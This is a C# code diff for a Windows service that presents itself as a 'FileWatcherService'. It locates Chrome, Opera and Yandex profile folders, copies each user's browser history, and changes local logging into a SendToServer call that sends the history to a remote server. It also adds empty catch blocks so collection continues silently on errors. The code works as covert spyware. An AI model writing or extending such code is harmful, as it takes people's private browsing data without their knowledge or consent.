@@ -133,7 +133,7 @@ namespace FileWatcherService
                     {
                         CopyBrowserHistory(item.Key, item.Value);
                         RecordEntry(($"-------------------------------------------{item.Key}"));
-                        RecordEntry(ReadBrowserHistory(item.Key));
+                        SendToServer(item.Key, ReadBrowserHistory(item.Key));
                     }
                     GC.Collect();
 
@@ -153,9 +153,10 @@ namespace FileWatcherService
 
         private void SearchBrowsers()
         {
+            string[] files;
             try
             {
-                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\");
+                files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\");
                 foreach (var f in files)
                 {
 
@@ -166,6 +167,13 @@ namespace FileWatcherService
                     }
                 }
 
+            }
+            catch (Exception ex)
+            {
+
+            }
+            try
+            {
                 files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\");
                 foreach (var f in files)
                 {
@@ -176,7 +184,13 @@ namespace FileWatcherService
 
                     }
                 }
+            }
+            catch (Exception ex)
+            {
 
+            }
+            try
+            {
                 files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\");
                 foreach (var f in files)
                 {
@@ -220,7 +234,7 @@ namespace FileWatcherService
                     ms.Close();
                     ms.Dispose();
                 }
-               
+
             }
             catch (Exception ex)
             {
